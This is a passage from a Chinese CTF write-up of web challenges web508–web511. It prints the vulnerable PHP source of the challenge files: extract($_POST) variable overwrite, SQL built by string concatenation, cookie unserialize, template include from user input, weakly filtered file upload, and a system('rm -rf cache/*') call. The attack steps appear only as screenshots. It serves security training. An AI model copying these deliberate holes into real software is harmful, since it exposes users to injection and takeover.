class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;path))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;id))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次对文件上传进行了过滤</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414130230633.png" alt="image-20220414130230633"></p>
<p>从这里传</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414130410885.png" alt="image-20220414130410885"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414130450436.png" alt="image-20220414130450436"></p>
<h1 id="web508"><a href="#web508" class="headerlink" title="web508"></a>web508</h1><p>api&#x2F;admin_edit.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-15 04:27:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 07:45:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|\\\/&#x27;</span>, <span class="variable">$avatar</span>))&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;存在无效字符&#x27;</span>;</span><br><span class="line">		<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;update user set nickname=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$nickname</span>, <span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;,avatar=&#x27;&quot;</span>.<span class="variable">$avatar</span>.<span class="string">&quot;&#x27; where username=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>],<span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>]=<span class="variable">$nickname</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;avatar&#x27;</span>]=<span class="variable">$avatar</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可见这里并没有将图片放到本地,而是放到了session里面</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414131751499.png" alt="image-20220414131751499"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414131808105.png" alt="image-20220414131808105"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414132009224.png" alt="image-20220414132009224"></p>
<h1 id="web509"><a href="#web509" class="headerlink" title="web509"></a>web509</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414133327832.png" alt="image-20220414133327832"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414133433745.png" alt="image-20220414133433745"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414133503550.png" alt="image-20220414133503550"></p>
<h1 id="web510"><a href="#web510" class="headerlink" title="web510"></a>web510</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414133936922.png" alt="image-20220414133936922"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414134023254.png" alt="image-20220414134023254"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414134049496.png" alt="image-20220414134049496"></p>
<h1 id="web511"><a href="#web511" class="headerlink" title="web511"></a>web511</h1><p>&#x2F;index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 16:43:05</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\:|\,/&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">			<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|or|innodb|sys|mysql/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&quot;select username,nickname,avatar from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">			<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">			<span class="variable">$user</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="variable">$user</span>;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=index&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;clear&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">		<span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;view&#x27;</span>:</span><br><span class="line">		<span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>],<span class="variable">$user</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;logout&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>api&#x2F;admin_templates.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-19 18:49:54</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 17:17:07</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$user</span>))&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select id,name,type,path,des from templates limit 0,10&quot;</span>;</span><br><span class="line">		<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="variable">$temps</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>);</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="variable">$temps</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="variable">$row</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$row</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span> =<span class="string">&quot;update templates set name=&#x27;<span class="subst">&#123;$row-&gt;name&#125;</span>&#x27;,path=&#x27;<span class="subst">&#123;$row-&gt;path&#125;</span>&#x27;,type=&#x27;<span class="subst">&#123;$row-&gt;type&#125;</span>&#x27;,des=&#x27;<span class="subst">&#123;$row-&gt;des&#125;</span>&#x27; where id =<span class="subst">&#123;$row-&gt;id&#125;</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新成功&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;getContents&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="variable">$template</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$template</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$template</span>-&gt;path))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$template</span>-&gt;path)));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$path</span>))&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>); </span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:  attachment; filename=&quot;&#x27;</span> . <span class="variable">$path</span>. <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|phar|ini|settings/i&#x27;</span>, <span class="variable">$name</span>))</span><br><span class="line">		&#123;	</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#x27;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$name</span>, <span class="variable">$content</span>);</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="comment"># code...</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$row</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;name))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;type))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;des))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;path))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;id))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>api&#x2F;admin_edit.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-15 04:27:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 07:45:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|\\\/&#x27;</span>, <span class="variable">$avatar</span>))&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;存在无效字符&#x27;</span>;</span><br><span class="line">		<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;update user set nickname=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$nickname</span>, <span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;,avatar=&#x27;&quot;</span>.<span class="variable">$avatar</span>.<span class="string">&quot;&#x27; where username=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>],<span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>]=<span class="variable">$nickname</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;avatar&#x27;</span>]=<span class="variable">$avatar</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span 